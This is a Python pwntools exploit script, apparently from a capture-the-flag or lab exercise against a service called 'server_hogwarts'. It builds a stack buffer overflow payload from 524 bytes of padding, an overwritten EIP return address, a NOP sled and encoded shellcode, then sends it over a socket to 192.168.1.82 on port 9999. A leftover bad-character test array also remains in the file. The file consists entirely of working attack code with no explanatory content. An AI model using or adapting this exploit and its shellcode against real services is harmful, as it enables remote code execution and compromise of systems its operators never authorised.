#!/usr/bin/python3

from pwn import *
import socket

#p = process('./server_hogwarts')

offset = b'A' * 524
#eip = b'B' * 4
after_eip = b'C' * 100


eip = p32(0x311712F3)
#eip = b"\x"


byte_array = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = (b"\xda\xc4\xbb\x38\xb8\xcd\x88\xd9\x74\x24\xf4\x5e\x33\xc9"
b"\xb1\x52\x83\xee\xfc\x31\x5e\x13\x03\x66\xab\x2f\x7d\x6a"
b"\x23\x2d\x7e\x92\xb4\x52\xf6\x77\x85\x52\x6c\xfc\xb6\x62"
b"\xe6\x50\x3b\x08\xaa\x40\xc8\x7c\x63\x67\x79\xca\x55\x46"
b"\x7a\x67\xa5\xc9\xf8\x7a\xfa\x29\xc0\xb4\x0f\x28\x05\xa8"
b"\xe2\x78\xde\xa6\x51\x6c\x6b\xf2\x69\x07\x27\x12\xea\xf4"
b"\xf0\x15\xdb\xab\x8b\x4f\xfb\x4a\x5f\xe4\xb2\x54\xbc\xc1"
b"\x0d\xef\x76\xbd\x8f\x39\x47\x3e\x23\x04\x67\xcd\x3d\x41"
b"\x40\x2e\x48\xbb\xb2\xd3\x4b\x78\xc8\x0f\xd9\x9a\x6a\xdb"
b"\x79\x46\x8a\x08\x1f\x0d\x80\xe5\x6b\x49\x85\xf8\xb8\xe2"
b"\xb1\x71\x3f\x24\x30\xc1\x64\xe0\x18\x91\x05\xb1\xc4\x74"
b"\x39\xa1\xa6\x29\x9f\xaa\x4b\x3d\x92\xf1\x03\xf2\x9f\x09"
b"\xd4\x9c\xa8\x7a\xe6\x03\x03\x14\x4a\xcb\x8d\xe3\xad\xe6"
b"\x6a\x7b\x50\x09\x8b\x52\x97\x5d\xdb\xcc\x3e\xde\xb0\x0c"
b"\xbe\x0b\x16\x5c\x10\xe4\xd7\x0c\xd0\x54\xb0\x46\xdf\x8b"
b"\xa0\x69\x35\xa4\x4b\x90\xde\x0b\x23\x9b\x52\xe4\x36\x9b"
b"\x6b\x4f\xbf\x7d\x01\xbf\x96\xd6\xbe\x26\xb3\xac\x5f\xa6"
b"\x69\xc9\x60\x2c\x9e\x2e\x2e\xc5\xeb\x3c\xc7\x25\xa6\x1e"
b"\x4e\x39\x1c\x36\x0c\xa8\xfb\xc6\x5b\xd1\x53\x91\x0c\x27"
b"\xaa\x77\xa1\x1e\x04\x65\x38\xc6\x6f\x2d\xe7\x3b\x71\xac"
b"\x6a\x07\x55\xbe\xb2\x88\xd1\xea\x6a\xdf\x8f\x44\xcd\x89"
b"\x61\x3e\x87\x66\x28\xd6\x5e\x45\xeb\xa0\x5e\x80\x9d\x4c"
b"\xee\x7d\xd8\x73\xdf\xe9\xec\x0c\x3d\x8a\x13\xc7\x85\xaa"
b"\xf1\xcd\xf3\x42\xac\x84\xb9\x0e\x4f\x73\xfd\x36\xcc\x71"
b"\x7e\xcd\xcc\xf0\x7b\x89\x4a\xe9\xf1\x82\x3e\x0d\xa5\xa3"
b"\x6a")


payload = offset + eip + b"\x90"*32 + shellcode

ip_address = "192.168.1.82"
port = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_address, port))
banner = s.recv(1024)
s.send(payload)
